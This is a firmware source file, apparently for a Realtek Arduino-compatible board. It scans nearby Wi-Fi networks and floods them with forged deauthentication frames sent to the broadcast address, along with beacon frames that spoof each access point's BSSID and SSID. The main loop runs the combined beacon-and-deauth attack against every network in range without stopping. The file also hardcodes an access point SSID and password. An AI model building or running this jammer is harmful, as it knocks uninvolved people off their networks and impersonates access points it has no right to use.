// Core includes
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

#undef max
#undef min
#include <SPI.h>
#include <Wire.h>
#include <vector>
#include <map>
#include "debug.h"

// Button pin definitions
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13

// Timing constants
const unsigned long DEBOUNCE_DELAY = 150;

// Wi-Fi credentials
char *ssid = "SpectrumSetup-P00";
char *pass = "4mongusFr!ng";

// Struct to hold scan results
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

std::vector<WiFiScanResult> scan_results;
int scrollindex = 0;
uint8_t deauth_bssid[6], beacon_bssid[6];
uint16_t deauth_reason;
int perdeauth = 3;

// Debounce timing
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;

// Scan handler
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

void attackSingle() {
  memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
  for (int i = 0; i < 3; i++) {
    for (uint16_t reason : {1, 4, 16}) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
    }
  }
}

void attackAll() {
  for (auto &ap : scan_results) {
    memcpy(deauth_bssid, ap.bssid, 6);
    wext_set_channel(WLAN0_NAME, ap.channel);
    Serial.println("{deauth_bssid}");
    for (int i = 0; i < perdeauth; i++) {
      for (uint16_t reason : {1, 4, 16}) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
      }
    }
  }
}

void beaconOnly() {
  for (auto &ap : scan_results) {
    memcpy(beacon_bssid, ap.bssid, 6);
    wext_set_channel(WLAN0_NAME, ap.channel);
    for (int i = 0; i < 10; i++) {
      wifi_tx_beacon_frame(beacon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ap.ssid.c_str());
    }
  }
}

void beaconAndDeauth() {
  // Ensure the Serial communication is initialized
  Serial.begin(115200); // Adjust the baud rate as needed

  for (auto &ap : scan_results) {
    // Copy the BSSID from the access point
    memcpy(beacon_bssid, ap.bssid, 6);
    memcpy(deauth_bssid, ap.bssid, 6);
    
    // Set the channel for the Wi-Fi interface
    wext_set_channel(WLAN0_NAME, ap.channel);
    
    // Log the BSSID and SSID to the Serial Monitor
    Serial.print("Processing AP: ");
    Serial.print("BSSID: ");
    for (int j = 0; j < 6; j++) {
      Serial.print(beacon_bssid[j], HEX);
      if (j < 5) Serial.print(":");
    }
    Serial.print(", SSID: ");
    Serial.println(ap.ssid.c_str());
    
    // Transmit beacon and deauth frames
    for (int i = 0; i < 10; i++) {
      wifi_tx_beacon_frame(beacon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ap.ssid.c_str());
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      
      // Log the transmission
      Serial.print("Transmitted beacon and deauth frame for ");
      Serial.println(ap.ssid.c_str());
    }
  }
}


void waitForButtonRelease(int pin) {
  while (digitalRead(pin) == LOW) delay(10);
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  Serial.begin(115200);
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(1).c_str());

  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (auto &ap : scan_results) {
    DEBUG_SER_PRINT(ap.ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(ap.bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(ap.channel) + " ");
    DEBUG_SER_PRINT(String(ap.rssi) + "\n");
  }
#endif
}

void loop() {
  /* static int mode = 2;  // 0: Scan, 1: Single, 2: All, 3: Beacon, 4: Combo

  unsigned long currentTime = millis();

  if (digitalRead(BTN_DOWN) == LOW && currentTime - lastDownTime > DEBOUNCE_DELAY) {
    mode = (mode + 1) % 5;
    lastDownTime = currentTime;
    waitForButtonRelease(BTN_DOWN);
  }

  if (digitalRead(BTN_UP) == LOW && currentTime - lastUpTime > DEBOUNCE_DELAY) {
    mode = (mode + 4) % 5;  // Cycle backward
    lastUpTime = currentTime;
    waitForButtonRelease(BTN_UP);
  }

  if (digitalRead(BTN_OK) == LOW && currentTime - lastOkTime > DEBOUNCE_DELAY) {
    waitForButtonRelease(BTN_OK);
    DEBUG_SER_PRINT("Running mode: " + String(mode) + "\n");

    switch (mode) {
      case 0:
        scanNetworks();
        break;
      case 1:
        attackSingle();
        break;
      case 2:
        attackAll();
        break;
      case 3:
        beaconOnly();
        break;
      case 4:
        beaconAndDeauth();
        break;
    }
    lastOkTime = currentTime;
  }
  */
  beaconAndDeauth();
  delay(50);
}
